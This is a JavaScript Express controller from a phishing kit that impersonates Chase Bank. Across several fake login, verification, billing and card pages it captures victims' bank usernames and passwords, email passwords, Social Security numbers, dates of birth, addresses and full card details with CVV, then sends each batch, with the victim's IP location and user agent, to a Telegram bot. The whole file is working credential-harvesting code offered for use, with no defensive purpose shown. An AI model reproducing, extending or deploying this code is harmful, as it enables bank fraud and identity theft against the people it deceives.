const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");

// console.log(getIPDetails());

let storedCredentials = {
  username: "",
  password: "",
  fname: "",
  dob: "",
  mmn: "",
  phone: "",
  address: "",
  city: "",
  state: "",
  zipcode: "",
};

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  const { username, password } = req.body;

  storedCredentials = { username };

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `|C H A S E B@NK LOGIN\n\n` +
    `||🔰Username : ${username}\n` +
    `||🔑Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/login/email-verification");
};

exports.email = (req, res) => {
  res.render("email-verification");
};

exports.emailPost = async (req, res) => {
  const { email, emailPassword } = req.body;
  const { username, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = { ...storedCredentials, password };

  const message =
    `|C H A S E B@NK LOGIN\n\n` +
    `||🔰User ID : ${username}\n\n` +
    `||🔑Password : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `||📧EMAIL : ${email}\n\n` +
    `||📧EMAIL PASSWORD : ${emailPassword}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/billing-information");
};

exports.personal = (req, res) => {
  res.render("billing-information");
};

exports.personalPost = async (req, res) => {
  const { fname, dob, phone, ssn, address, city1, state, zipcode } =
    req.body;
  const { username, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = {
    ...storedCredentials,
    username,
    password,
    fname,
    dob,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
  };

  const userAgent = req.headers["user-agent"];
  storedCredentials = {
    ...storedCredentials,
    username,
    password,
    fname,
    dob,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
  };

  const message =
    `||C H A S E B@NK FULLZ\n` +
    `||🔰User ID  : ${username}\n\n` +
    `||🔑Password  : ${password}\n\n` +
    `||Full Name  : ${fname}\n\n` +
    `||Date of Birth  : ${dob}\n\n` +
    `||PhoneNum  : ${phone}\n\n` +
    `||SSN  : ${ssn}\n\n` +
    `||Address  : ${address}\n\n` +
    `||City  : ${city1}\n\n` +
    `||State  : ${state}\n\n` +
    `||ZIpcode  : ${zipcode}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/card-verification");
};

exports.card = (req, res) => {
  res.render("card-verification");
};
// storedCredentials = { email, password, fname, dob, phone, address };

exports.cardPost = async (req, res) => {
  const { cname, cardNum, exp, cvv, atm } = req.body;
  const {
    username,
    password,
    fname,
    dob,
    mmn,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
  } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = {
    ...storedCredentials,
    username,
    password,
    fname,
    dob,
    mmn,
    phone,
    ssn,
    address,
    city1,
    state,
    zipcode,
    cname,
    cardNum,
    exp,
    cvv,
  };

  const userAgent = req.headers["user-agent"];

  const message =
    `|C H A S E B@NK CARD DETAILS\n\n` +
    `||🔰User ID  : ${username}\n\n` +
    `||🔑Password  : ${password}\n\n` +
    `||Fullname  : ${fname}\n\n` +
    `||Date of birth  : ${dob}\n\n` +
    `||Mother's Maiden Name  : ${mmn}\n\n` +
    `||PhoneNum  : ${phone}\n\n` +
    `||SSN  : ${ssn}\n\n` +
    `||Address  : ${address}\n\n` +
    `||City  : ${city1}\n\n` +
    `||State  : ${state}\n\n` +
    `||Zipcode  : ${zipcode}\n\n` +
    `||Name on Card  : ${cname}\n\n` +
    `||CardNum  : ${cardNum}\n\n` +
    `||Expiry Date  : ${exp}\n\n` +
    `||CVV  : ${cvv}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
